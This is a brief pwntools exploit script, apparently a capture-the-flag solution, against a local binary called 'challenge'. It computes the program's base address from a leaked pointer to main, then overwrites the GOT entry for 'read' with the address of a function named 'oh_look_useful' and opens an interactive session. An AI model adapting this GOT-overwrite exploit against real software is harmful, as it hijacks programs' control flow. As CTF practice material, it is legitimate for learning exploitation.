from pwn import *

context.binary = "./challenge"
p = process()
elf = context.binary

#main_leak = p.u32()
main_leak = p.unpack()
main_address = elf.symbols["main"]
base_address = main_leak - main_address

#elf.address += base_address
where_addr = elf.got["read"] + base_address
what_addr = elf.symbols["oh_look_useful"] + base_address

#p.send(p32(where_addr))
#p.send(p32(what_addr))
p.pack(where_addr)
p.pack(what_addr)
p.interactive()